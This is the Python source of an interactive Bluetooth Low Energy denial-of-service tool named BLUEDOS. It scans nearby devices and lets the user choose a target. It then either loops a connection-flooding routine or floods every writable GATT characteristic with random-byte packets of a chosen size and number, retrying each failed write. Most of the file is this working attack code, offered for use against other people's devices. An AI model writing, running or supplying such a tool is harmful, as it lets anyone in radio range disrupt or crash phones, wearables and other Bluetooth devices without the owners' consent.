import threading
import os
import sys
from colorama import *
import shutil
import asyncio
from bleak import BleakScanner, BleakClient
import subprocess as sp
import random
import time
from modules.findServices import *
from modules.conn import *
import warnings
warnings.filterwarnings("ignore", category=FutureWarning)
init()

logo = f"""
{Fore.BLUE}

 ______     __         __  __     ______     _____     ______     ______    
/\  == \   /\ \       /\ \/\ \   /\  ___\   /\  __-.  /\  __ \   /\  ___\   
\ \  __<   \ \ \____  \ \ \_\ \  \ \  __\   \ \ \/\ \ \ \ \/\ \  \ \___  \  
 \ \_____\  \ \_____\  \ \_____\  \ \_____\  \ \____-  \ \_____\  \/\_____\ 
  \/_____/   \/_____/   \/_____/   \/_____/   \/____/   \/_____/   \/_____/ 
                                                                            
{Style.RESET_ALL}
"""
os.system("clear")
print(logo)
print(f"{Fore.BLUE}{Style.BRIGHT}Scanning...{Style.RESET_ALL}")

async def scan():
    global devices
    devices = await BleakScanner.discover()
    return devices

loop = asyncio.get_event_loop()
loop.run_until_complete(scan())
max_len = -1

for device in devices:
    name = device.name if device.name else "Unknown"
    if len(name) > max_len:
        max_len = len(name)

if max_len < 17:
    max_len = 17

name_padding = 2
name_width = max_len + (name_padding * 2)
mac_padding = 2
mac_width = 17 + (mac_padding * 2)
number_width = 5

print("┌" + ("─" * number_width) + "┬" + ("─" * name_width) + "┬" + ("─" * mac_width) + "┐")
print("│" + " # ".center(number_width) + "│" + " Device Name ".center(name_width) + "│" + " MAC Address ".center(mac_width) + "│")
print("├" + ("─" * number_width) + "┼" + ("─" * name_width) + "┼" + ("─" * mac_width) + "┤")

for index, device in enumerate(devices, start=1):
    name = device.name if device.name else "Unknown"
    mac = device.address
    colored_name = f"{Fore.CYAN}{name}{Style.RESET_ALL}"
    colored_mac = f"{Fore.YELLOW}{mac}{Style.RESET_ALL}"
    padded_name = f" {colored_name} ".center(name_width + len(Fore.CYAN) + len(Style.RESET_ALL))
    padded_mac = f" {colored_mac} ".center(mac_width + len(Fore.YELLOW) + len(Style.RESET_ALL))
    print("│" + str(index).center(number_width) + "│" + padded_name + "│" + padded_mac + "│")

print("└" + ("─" * number_width) + "┴" + ("─" * name_width) + "┴" + ("─" * mac_width) + "┘")

while True:
    number = input(f"{Style.RESET_ALL}Enter target number: {Fore.RED}")
    if number.isdigit():
        if 0 < int(number) <= len(devices):
            break
        else:
            print(f"{Fore.RED}Invalid number. Please choose a number between 1 and {len(devices)}.{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Invalid input. Please enter a numeric value.{Style.RESET_ALL}")

target = devices[int(number) - 1]
target_name = target.name if target.name else "Unknown"
print(f"{Style.RESET_ALL}Target: {Fore.RED}{Style.BRIGHT}" + target_name + f"{Style.RESET_ALL}")
while True:
    size = shutil.get_terminal_size()
    print(f"{Style.RESET_ALL}{Fore.WHITE}─{Style.RESET_ALL}" * size.columns)
    print(f"{Fore.BLUE}What would you like to do?{Style.RESET_ALL}")
    print(f"{Fore.WHITE}{Style.BRIGHT}[1] ATTACK  [2] INFORMATION [3] RESCAN [4] EXIT{Style.RESET_ALL}")

    while True:
        option = input(f"{Fore.BLUE}Option:{Style.RESET_ALL} {Fore.WHITE}{Style.BRIGHT}")
        if option.isdigit():
            if 0 < int(option) < 5:
                break
            else:
                print(f"{Style.RESET_ALL}{Fore.RED}Please enter a number between 1 and 4!{Style.RESET_ALL}")
        else:
            print(f"{Style.RESET_ALL}{Fore.RED}Please enter a numeric value!{Style.RESET_ALL}")

    if option == "1":
        print(f"{Fore.BLUE}What would you like to do?{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{Style.BRIGHT}[1] CONNECT_DOS  [2] PACKET_SENDER [3] BACK{Style.RESET_ALL}")

        while True:
            option2 = input(f"{Fore.BLUE}Option:{Style.RESET_ALL} {Fore.WHITE}{Style.BRIGHT}")
            if option2.isdigit():
                if 0 < int(option2) < 4:
                    break
                else:
                    print(f"{Style.RESET_ALL}{Fore.RED}Please enter a number between 1 and 3!{Style.RESET_ALL}")
            else:
                print(f"{Style.RESET_ALL}{Fore.RED}Please enter a numeric value!{Style.RESET_ALL}")
        if option2 == "2":
            while True:
                leastSize = input(f"{Fore.BLUE}Enter the lowest packet size to send:{Style.RESET_ALL} {Fore.WHITE}{Style.BRIGHT}")
                if leastSize.isdigit():
                    if 0 < int(leastSize):
                        break
                    else:
                        print(f"{Style.RESET_ALL}{Fore.RED}Please enter a number greater than 0!{Style.RESET_ALL}")
                else:
                    print(f"{Style.RESET_ALL}{Fore.RED}Please enter a numeric value!{Style.RESET_ALL}")
            while True:
                maxSize = input(f"{Fore.BLUE}Enter the highest packet size to send:{Style.RESET_ALL} {Fore.WHITE}{Style.BRIGHT}")
                if maxSize.isdigit():
                    if 0 < int(maxSize):
                        break
                    else:
                        print(f"{Style.RESET_ALL}{Fore.RED}Please enter a number greater than 0!{Style.RESET_ALL}")
                else:
                    print(f"{Style.RESET_ALL}{Fore.RED}Please enter a numeric value!{Style.RESET_ALL}")
            while True:
                packetCount = input(f"{Fore.BLUE}Enter the number of packets to send:{Style.RESET_ALL} {Fore.WHITE}{Style.BRIGHT}")
                if packetCount.isdigit():
                    if 0 < int(packetCount):
                        break
                    else:
                        print(f"{Style.RESET_ALL}{Fore.RED}Please enter a number greater than 0!{Style.RESET_ALL}")
                else:
                    print(f"{Style.RESET_ALL}{Fore.RED}Please enter a numeric value!{Style.RESET_ALL}")


            print(f"{Fore.RED}{Style.BRIGHT}Starting attack...{Style.RESET_ALL}")

            async def fuzz_ble_device(device_address, fuzz_min_size=10, fuzz_max_size=65536, max_packet_count=10000):
                print(f"[INFO] Starting fuzzing attack on {device_address}")
                try:
                    print(f"[INFO] Attempting to connect to {device_address}...")
                    async with BleakClient(device_address) as client:
                        if client.is_connected:
                            print(f"{Fore.GREEN}[SUCCESS] Connected to {device_address}{Style.RESET_ALL}")
                            print(f"{Fore.WHITE}[INFO] Performing service discovery...{Style.RESET_ALL}")
                            
                            # Explicit service discovery
                            services = await client.get_services()
                            print(f"{Fore.GREEN}[SUCCESS] Service discovery completed.{Style.RESET_ALL}")

                            writable_characteristics = []

                            # Detect writable characteristics
                            for service in services:
                                for char in service.characteristics:
                                    if "write" in char.properties or "write-without-response" in char.properties:
                                        writable_characteristics.append(char)
                                        print(f"{Fore.GREEN}[SUCCESS] Writable characteristic: {char.uuid}{Style.RESET_ALL}")
                            
                            if not writable_characteristics:
                                print(f"{Fore.RED}[CRITICAL] No writable characteristics found on {device_address}. Exiting...{Style.RESET_ALL}")
                                return

                            print(f"{Fore.WHITE}[INFO] Found {len(writable_characteristics)} writable characteristics.{Style.RESET_ALL}")

                            packet_count = 0
                            while packet_count < int(max_packet_count):
                                for char in writable_characteristics:
                                    fuzz_size = random.randint(fuzz_min_size, fuzz_max_size)
                                    random_data = bytearray([random.randint(0, 255) for _ in range(fuzz_size)])
                                    
                                    # Ensure the fuzz size doesn't exceed the maximum allowed length
                                    max_len = char.max_value_length if hasattr(char, 'max_value_length') else fuzz_max_size
                                    fuzz_size = min(fuzz_size, max_len)  # Cap the fuzz size to the max length allowed by the characteristic
                                    
                                    print(f"{Fore.WHITE}[INFO] Sending packet {packet_count + 1}/{max_packet_count} to {char.uuid}: Size = {fuzz_size} bytes{Style.RESET_ALL}")

                                    # Ensure service discovery is complete before each operation
                                    try:
                                        # Retry logic if service discovery hasn't been completed yet
                                        if not client.is_connected:
                                            await client.connect()  # Reconnect if the client is disconnected
                                        await asyncio.sleep(0.2)  # Ensure a brief pause to allow service discovery to settle

                                        if hasattr(char, 'handle'):
                                            await client.write_gatt_char(char.handle, random_data)
                                        else:
                                            await client.write_gatt_char(char.uuid, random_data)

                                        print(f"{Fore.GREEN}[SUCCESS] Packet {packet_count + 1} sent to {char.uuid}: {random_data[:10]}... (truncated){Style.RESET_ALL}")
                                        packet_count += 1
                                    except Exception as e:
                                        print(f"{Fore.RED}[ERROR] Failed to send packet {packet_count + 1} to {char.uuid}: {e}{Style.RESET_ALL}")
                                        
                                        # Retry logic for failed packets
                                        retry_count = 0
                                        max_retries = 5
                                        while retry_count < max_retries:
                                            try:
                                                retry_delay = 0.1 * (2 ** retry_count)  # Exponential backoff
                                                print(f"{Fore.WHITE}[INFO] Retrying packet {packet_count + 1} to {char.uuid} (Attempt {retry_count + 1}) after {retry_delay:.2f}s...{Style.RESET_ALL}")
                                                await asyncio.sleep(retry_delay)
                                                # Retry with handle if necessary
                                                if hasattr(char, 'handle'):
                                                    await client.write_gatt_char(char.handle, random_data)
                                                else:
                                                    await client.write_gatt_char(char.uuid, random_data)
                                                print(f"{Fore.GREEN}[SUCCESS] Retry successful for packet {packet_count + 1} to {char.uuid}{Style.RESET_ALL}")
                                                break
                                            except Exception as retry_error:
                                                print(f"{Fore.RED}[ERROR] Retry {retry_count + 1} failed: {retry_error}{Style.RESET_ALL}")
                                                retry_count += 1

                                        if retry_count == max_retries:
                                            print(f"{Fore.RED}[CRITICAL] Packet {packet_count + 1} could not be sent to {char.uuid} after {max_retries} retries. Skipping...{Style.RESET_ALL}")

                                    await asyncio.sleep(0.05)

                                    if packet_count >= max_packet_count:
                                        break
                                
                            print(f"{Fore.WHITE}[INFO] Fuzzing attack completed. Total packets sent: {packet_count}{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.RED}[ERROR] Could not connect to {device_address}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}[CRITICAL] Fuzzing attack failed: {e}{Style.RESET_ALL}")
                    print(e)



            device_address = target.address

            loop = asyncio.get_event_loop()
            loop.run_until_complete(fuzz_ble_device(device_address,int(leastSize),int(maxSize),int(packetCount)))
        elif option2 == "1":
            namet = input("Enter the temporary device name: ")
            print(f"{Fore.RED}{Style.BRIGHT}Starting attack...{Style.RESET_ALL}")
            while True:
                bt_control(namet, target.address)

    elif option == "2":
        size = shutil.get_terminal_size()
        print(f"{Style.RESET_ALL}{Fore.WHITE}─{Style.RESET_ALL}" * size.columns)
        print(f"{Fore.BLUE}{Style.BRIGHT}Basic Information{Style.RESET_ALL}")
        print(f"{Fore.BLUE}Name: {Fore.YELLOW}{Style.BRIGHT}{target.name}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}Address: {Fore.YELLOW}{Style.BRIGHT}{target.address}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}RSSI: {Fore.YELLOW}{Style.BRIGHT}{target.rssi}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}Details: {Fore.YELLOW}{Style.BRIGHT}{target.details}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}Metadata: {Fore.YELLOW}{Style.BRIGHT}{target.metadata}{Style.RESET_ALL}")
        print(f"{Style.RESET_ALL}{Fore.WHITE}─{Style.RESET_ALL}" * size.columns)
        print(f"{Fore.BLUE}{Style.BRIGHT}Services{Style.RESET_ALL}")
        findServices(target.address)
    elif option == "3":
        os.execl(sys.executable, sys.executable, *sys.argv)
    elif option == "4":
        exit()
